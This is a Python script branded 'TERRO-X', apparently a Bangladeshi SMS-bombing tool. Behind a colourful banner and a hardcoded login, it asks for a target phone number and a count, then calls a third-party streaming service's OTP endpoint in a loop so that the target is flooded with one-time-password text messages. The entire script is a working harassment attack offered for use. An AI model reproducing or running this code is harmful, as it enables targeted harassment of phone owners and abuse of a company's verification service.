import sys

green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
on_ipurple="\033[10;95m"  # Purple
on_icyan="\033[0;106m"    # Cyan
on_iwhite="\033[0;107m"   # White
blue="\033[0;34m"         # Blue
red="\033[0;31m"          # Red
cyan="\033[0;36m"         # Cyan


# Underline
ublack="\033[4;30m"       # Black
ured="\033[4;31m"         # Red
ugreen="\033[4;32m"       # Green
uyellow="\033[4;33m"      # Yellow
ublue="\033[4;34m"        # Blue
upurple="\033[4;35m"      # Purple
ucyan="\033[4;36m"        # Cyan
uwhite="\033[4;37m"       # White
print(green+"""
████████╗███████╗██████╗ ██████╗  ██████╗      ██╗  ██╗
╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗     ╚██╗██╔╝
   ██║   █████╗  ██████╔╝██████╔╝██║   ██║█████╗╚███╔╝ 
   ██║   ██╔══╝  ██╔══██╗██╔══██╗██║   ██║╚════╝██╔██╗ 
   ██║   ███████╗██║  ██║██║  ██║╚██████╔╝     ██╔╝ ██╗
   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝  ╚═╝
                                                       
""")




number=0
while number <=10:
	
	username="terro"
	password="74148"
	
	intusername=str(input(on_ipurple+"\nEnter The Tools user name: "))
	intpassword=str(input(yellow+"\nEnter The Tools password:"))
	if username==intusername and password==intpassword:
		print(green+"   Login susseccful? \n\n					[𝔻𝕖𝕧𝕖𝕝𝕠𝕡𝕖𝕕]\n")
		break
	else:
		print(red+"You Are Worng Username Or Wrong Password ")
		
print(green+"				[𝔽𝕒𝕣𝕒𝕓𝕚 ℂ𝕙𝕠𝕨𝕕𝕙𝕦𝕣𝕪]\n\n")
			
		
print(cyan+"╔═══════ 	- 	════════╗   \n")

print("𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 𝔹𝔻🎭ℂ𝕐𝔹𝔼ℝ🎭𝕋𝔼ℝℝ𝕆   ")


print(cyan+"\n╚═══════   	-       ════════╝  ")



import requests

number=str(input(red+"\nEnter Target Number: ")) 
amount=int(input(blue+"\nEnter The amount: "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"


for i in range(amount):
	requests.get(api)
	print(red+str(i+1)+"★Terro-x★=> sms send ")
